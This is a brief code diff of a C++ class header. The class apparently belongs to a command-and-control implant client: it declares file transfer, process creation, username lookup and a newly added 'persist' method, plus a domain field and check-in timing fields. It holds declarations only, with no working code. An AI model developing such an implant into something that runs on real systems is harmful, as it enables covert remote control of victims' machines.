@@ -21,12 +21,14 @@ public:
 	void write_file(const string&);
 	string fetch_file(const string&);
 	string create_process(const string&);
+	string query_username();
+	string persist();
 
 private:
-	unsigned int client_id;
+	unsigned char client_id;
 	string domain;
-	string packet_id;
-	unsigned int interval;
+	unsigned int checkin_interval_ms;
+	unsigned int send_delay_ms;
 	deque<Packet> outbound_queue;
 	vector<Packet> packet_buffer;
 };
